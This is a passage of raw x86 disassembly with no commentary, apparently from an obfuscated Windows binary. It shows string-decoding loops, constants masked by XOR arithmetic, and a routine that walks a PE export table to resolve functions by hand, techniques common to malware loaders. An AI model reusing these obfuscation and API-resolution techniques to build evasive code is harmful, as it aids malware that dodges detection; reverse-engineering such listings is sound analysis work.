  4269a5:	mov    ecx,edi
  4269a7:	add    edi,0xffffc4a3
  4269ad:	xor    edi,esi
  4269af:	mov    eax,0x4e38
  4269b4:	cmp    di,ax
  4269b7:	jne    0x426998
  4269b9:	xor    eax,eax
  4269bb:	pop    edi
  4269bc:	mov    WORD PTR [edx],ax
  4269bf:	mov    eax,DWORD PTR [ebp-0x4]
  4269c2:	pop    esi
  4269c3:	leave  
  4269c4:	ret    0x4
  4269c7:	push   ebp
  4269c8:	mov    ebp,esp
  4269ca:	sub    esp,0x18
  4269cd:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4269d4:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  4269db:	mov    ecx,DWORD PTR [ebp-0x8]
  4269de:	push   esi
  4269df:	mov    eax,0x75108af
  4269e4:	xor    ecx,eax
  4269e6:	mov    esi,0x3272f6
  4269eb:	add    ecx,esi
  4269ed:	mov    DWORD PTR [ebp-0x4],ecx
  4269f0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4269f7:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4269fe:	push   edi
  4269ff:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426a06:	jmp    0x426aa7
  426a0b:	mov    ecx,DWORD PTR [ebp-0x4]
  426a0e:	mov    edx,DWORD PTR [ebp+0x10]
  426a11:	sub    edx,ecx
  426a13:	mov    ecx,DWORD PTR [ebp-0xc]
  426a16:	xor    ecx,eax
  426a18:	add    ecx,esi
  426a1a:	cmp    edx,ecx
  426a1c:	jbe    0x426a39
  426a1e:	mov    edx,DWORD PTR [ebp-0x4]
  426a21:	add    edx,DWORD PTR [ebp+0x8]
  426a24:	mov    ecx,DWORD PTR [ebp-0x4]
  426a27:	add    ecx,DWORD PTR [ebp+0xc]
  426a2a:	mov    edi,DWORD PTR [ecx]
  426a2c:	mov    DWORD PTR [edx],edi
  426a2e:	mov    ecx,DWORD PTR [ecx+0x4]
  426a31:	mov    DWORD PTR [edx+0x4],ecx
  426a34:	mov    ecx,DWORD PTR [ebp-0xc]
  426a37:	jmp    0x426a86
  426a39:	mov    ecx,DWORD PTR [ebp-0x4]
  426a3c:	mov    edx,DWORD PTR [ebp+0x10]
  426a3f:	sub    edx,ecx
  426a41:	mov    ecx,DWORD PTR [ebp-0x10]
  426a44:	xor    ecx,eax
  426a46:	add    ecx,esi
  426a48:	cmp    edx,ecx
  426a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426a4d:	jbe    0x426a61
  426a4f:	add    ecx,DWORD PTR [ebp+0x8]
  426a52:	mov    edx,DWORD PTR [ebp-0x4]
  426a55:	add    edx,DWORD PTR [ebp+0xc]
  426a58:	mov    edx,DWORD PTR [edx]
  426a5a:	mov    DWORD PTR [ecx],edx
  426a5c:	mov    ecx,DWORD PTR [ebp-0x10]
  426a5f:	jmp    0x426a86
  426a61:	mov    edx,DWORD PTR [ebp+0x10]
  426a64:	sub    edx,ecx
  426a66:	mov    ecx,DWORD PTR [ebp-0x14]
  426a69:	xor    ecx,eax
  426a6b:	add    ecx,esi
  426a6d:	cmp    edx,ecx
  426a6f:	mov    ecx,DWORD PTR [ebp-0x4]
  426a72:	jbe    0x426a97
  426a74:	add    ecx,DWORD PTR [ebp+0x8]
  426a77:	mov    edx,DWORD PTR [ebp-0x4]
  426a7a:	add    edx,DWORD PTR [ebp+0xc]
  426a7d:	mov    dx,WORD PTR [edx]
  426a80:	mov    WORD PTR [ecx],dx
  426a83:	mov    ecx,DWORD PTR [ebp-0x14]
  426a86:	mov    edx,DWORD PTR [ebp-0x4]
  426a89:	xor    ecx,eax
  426a8b:	lea    ecx,[ecx+edx*1+0x3272f6]
  426a92:	mov    DWORD PTR [ebp-0x4],ecx
  426a95:	jmp    0x426aa7
  426a97:	add    ecx,DWORD PTR [ebp+0x8]
  426a9a:	mov    edx,DWORD PTR [ebp-0x4]
  426a9d:	add    edx,DWORD PTR [ebp+0xc]
  426aa0:	mov    dl,BYTE PTR [edx]
  426aa2:	mov    BYTE PTR [ecx],dl
  426aa4:	inc    DWORD PTR [ebp-0x4]
  426aa7:	mov    ecx,DWORD PTR [ebp-0x18]
  426aaa:	mov    edx,DWORD PTR [ebp+0x10]
  426aad:	xor    ecx,eax
  426aaf:	add    ecx,esi
  426ab1:	imul   ecx,edx
  426ab4:	mov    edx,DWORD PTR [ebp-0x8]
  426ab7:	mov    edi,DWORD PTR [ebp-0x4]
  426aba:	xor    edx,eax
  426abc:	lea    edx,[edx+edi*1+0x3272f6]
  426ac3:	cmp    edx,ecx
  426ac5:	jb     0x426a0b
  426acb:	pop    edi
  426acc:	pop    esi
  426acd:	leave  
  426ace:	ret    0xc
  426ad1:	push   ebp
  426ad2:	mov    ebp,esp
  426ad4:	sub    esp,0xc
  426ad7:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426ade:	push   esi
  426adf:	mov    esi,eax
  426ae1:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  426ae8:	mov    edx,DWORD PTR [ebp-0x4]
  426aeb:	mov    eax,0x75108af
  426af0:	xor    edx,eax
  426af2:	mov    ecx,0x3272f6
  426af7:	add    edx,ecx
  426af9:	cmp    esi,edx
  426afb:	je     0x426b3d
  426afd:	push   ebx
  426afe:	push   edi
  426aff:	mov    edx,DWORD PTR [ebp-0x8]
  426b02:	mov    ebx,DWORD PTR [ebp+0x8]
  426b05:	xor    edx,eax
  426b07:	mov    edi,0xffcd8d0a
  426b0c:	sub    edi,edx
  426b0e:	add    esi,edi
  426b10:	lea    edx,[esi-0x3272f6]
  426b16:	xor    edx,eax
  426b18:	mov    DWORD PTR [ebp-0xc],edx
  426b1b:	mov    edx,DWORD PTR [ebp-0x4]
  426b1e:	mov    edi,DWORD PTR [ebp-0xc]
  426b21:	xor    dl,0xaf
  426b24:	sub    dl,0xa
  426b27:	xor    edi,eax
  426b29:	mov    BYTE PTR [edi+ebx*1+0x3272f6],dl
  426b30:	mov    edx,DWORD PTR [ebp-0x4]
  426b33:	xor    edx,eax
  426b35:	add    edx,ecx
  426b37:	cmp    esi,edx
  426b39:	jne    0x426aff
  426b3b:	pop    edi
  426b3c:	pop    ebx
  426b3d:	pop    esi
  426b3e:	leave  
  426b3f:	ret    0x4
  426b42:	push   ebp
  426b43:	mov    ebp,esp
  426b45:	sub    esp,0x21c
  426b4b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  426b52:	mov    DWORD PTR [ebp-0x14],0xf89c85a4
  426b59:	mov    eax,DWORD PTR [ebp+0x10]
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	mov    ecx,DWORD PTR [ebp+0x8]
  426b62:	push   esi
  426b63:	push   edi
  426b64:	mov    edi,0x75108af
  426b69:	xor    eax,edi
  426b6b:	mov    esi,0x3272f6
  426b70:	add    eax,esi
  426b72:	cmp    eax,ecx
  426b74:	mov    eax,DWORD PTR [ebp-0x4]
  426b77:	jne    0x426b82
  426b79:	xor    eax,edi
  426b7b:	add    eax,esi
  426b7d:	jmp    0x426c2e
  426b82:	mov    ecx,DWORD PTR [ebp+0xc]
  426b85:	xor    eax,edi
  426b87:	add    eax,esi
  426b89:	cmp    eax,ecx
  426b8b:	jne    0x426b92
  426b8d:	mov    eax,DWORD PTR [ebp-0x4]
  426b90:	jmp    0x426b79
  426b92:	lea    eax,[ebp-0x21c]
  426b98:	mov    DWORD PTR [ebp-0x8],eax
  426b9b:	mov    eax,DWORD PTR [ebp+0xc]
  426b9e:	mov    DWORD PTR [ebp-0x10],eax
  426ba1:	mov    eax,DWORD PTR [ebp-0x4]
  426ba4:	xor    eax,edi
  426ba6:	add    eax,esi
  426ba8:	mov    DWORD PTR [ebp+0x10],eax
  426bab:	mov    eax,DWORD PTR [ebp+0xc]
  426bae:	push   ebx
  426baf:	call   0x4268d9
  426bb4:	mov    ebx,eax
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	mov    eax,DWORD PTR [eax+0x14]
  426bbc:	jmp    0x426c16
  426bbe:	mov    eax,DWORD PTR [ebp+0xc]
  426bc1:	sub    eax,0x8
  426bc4:	mov    DWORD PTR [ebp-0xc],eax
  426bc7:	mov    eax,DWORD PTR [ebp-0xc]
  426bca:	mov    eax,DWORD PTR [eax+0x28]
  426bcd:	call   0x4267c1
  426bd2:	mov    DWORD PTR [ebp+0x10],eax
  426bd5:	push   DWORD PTR [ebp+0x10]
  426bd8:	mov    edx,DWORD PTR [ebp-0x8]
  426bdb:	call   0x426968
  426be0:	mov    eax,DWORD PTR [ebp-0x4]
  426be3:	xor    eax,edi
  426be5:	add    eax,esi
  426be7:	cmp    eax,ebx
  426be9:	jne    0x426bf3
  426beb:	mov    eax,DWORD PTR [ebp-0x8]
  426bee:	call   0x42684f
  426bf3:	mov    eax,DWORD PTR [ebp-0x14]
  426bf6:	xor    eax,edi
  426bf8:	add    eax,esi
  426bfa:	push   eax
  426bfb:	push   DWORD PTR [ebp-0x10]
  426bfe:	mov    eax,DWORD PTR [ebp-0x8]
  426c01:	call   0x42657b
  426c06:	mov    ecx,DWORD PTR [ebp-0x4]
  426c09:	xor    ecx,edi
  426c0b:	add    ecx,esi
  426c0d:	cmp    eax,ecx
  426c0f:	je     0x426c34
  426c11:	mov    eax,DWORD PTR [ebp+0xc]
  426c14:	mov    eax,DWORD PTR [eax]
  426c16:	mov    DWORD PTR [ebp+0xc],eax
  426c19:	mov    eax,DWORD PTR [ebp+0x8]
  426c1c:	mov    ecx,DWORD PTR [ebp+0xc]
  426c1f:	add    eax,0x14
  426c22:	cmp    ecx,eax
  426c24:	jne    0x426bbe
  426c26:	mov    eax,DWORD PTR [ebp-0x4]
  426c29:	xor    eax,edi
  426c2b:	add    eax,esi
  426c2d:	pop    ebx
  426c2e:	pop    edi
  426c2f:	pop    esi
  426c30:	leave  
  426c31:	ret    0xc
  426c34:	mov    eax,DWORD PTR [ebp-0xc]
  426c37:	mov    eax,DWORD PTR [eax+0x18]
  426c3a:	jmp    0x426c2d
  426c3c:	push   ebp
  426c3d:	mov    ebp,esp
  426c3f:	mov    eax,DWORD PTR [ebp+0xc]
  426c42:	sub    esp,0x10
  426c45:	cmp    DWORD PTR [ebp+0x8],0x0
  426c49:	push   ebx
  426c4a:	push   esi
  426c4b:	push   edi
  426c4c:	je     0x426d01
  426c52:	test   eax,eax
  426c54:	je     0x426d01
  426c5a:	movzx  eax,WORD PTR [eax+0x20]
  426c5e:	mov    ecx,eax
  426c60:	mov    DWORD PTR [ebp-0x10],eax
  426c63:	xor    edx,edx
  426c65:	and    DWORD PTR [ebp-0x8],edx
  426c68:	mov    eax,0x8a9b
  426c6d:	xor    ecx,eax
  426c6f:	add    ecx,0x3b5d
  426c75:	mov    DWORD PTR [ebp-0xc],ecx
  426c78:	and    DWORD PTR [ebp-0x4],0x0
  426c7c:	xor    ecx,ecx
  426c7e:	push   0xffffff81
  426c80:	pop    edi
  426c81:	cmp    cx,WORD PTR [ebp-0xc]
  426c85:	jae    0x426ceb
  426c87:	lea    esi,[edx-0x3b5d]
  426c8d:	xor    esi,eax
  426c8f:	movzx  ecx,WORD PTR [ebp-0x4]
  426c93:	mov    ebx,DWORD PTR [ebp+0xc]
  426c96:	lea    ecx,[ebx+ecx*4]
  426c99:	cmp    WORD PTR [ecx+0x2],si
  426c9d:	jne    0x426cd6
  426c9f:	movzx  ecx,WORD PTR [ecx]
  426ca2:	mov    edi,0x4e38
  426ca7:	cmp    cx,di
  426caa:	jne    0x426cb8
  426cac:	mov    ebx,DWORD PTR [ebp+0x8]
  426caf:	movzx  edi,dx
  426cb2:	cmp    BYTE PTR [edi+ebx*1],0x0
  426cb6:	je     0x426ce5
  426cb8:	mov    ebx,DWORD PTR [ebp+0x8]
  426cbb:	movzx  edi,dx
  426cbe:	movsx  di,BYTE PTR [edi+ebx*1]
  426cc3:	mov    ebx,0x3b5d
  426cc8:	sub    di,bx
  426ccb:	xor    di,ax
  426cce:	cmp    cx,di
  426cd1:	je     0x426ce5
  426cd3:	push   0xffffff83
  426cd5:	pop    edi
  426cd6:	inc    DWORD PTR [ebp-0x4]
  426cd9:	mov    cx,WORD PTR [ebp-0xc]
  426cdd:	cmp    WORD PTR [ebp-0x4],cx
  426ce1:	jb     0x426c8f
  426ce3:	jmp    0x426ceb
  426ce5:	inc    DWORD PTR [ebp-0x8]
  426ce8:	push   0xffffff82
  426cea:	pop    edi
  426ceb:	mov    esi,DWORD PTR [ebp+0x8]
  426cee:	movzx  ecx,dx
  426cf1:	cmp    BYTE PTR [ecx+esi*1],0x0
  426cf5:	je     0x426d0a
  426cf7:	inc    edx
  426cf8:	cmp    edi,0xffffff83
  426cfb:	jne    0x426c78
  426d01:	xor    eax,eax
  426d03:	pop    edi
  426d04:	pop    esi
  426d05:	pop    ebx
  426d06:	leave  
  426d07:	ret    0x8
  426d0a:	mov    ecx,DWORD PTR [ebp-0x8]
  426d0d:	add    ecx,0xffffc4a3
  426d13:	xor    cx,ax
  426d16:	xor    eax,eax
  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
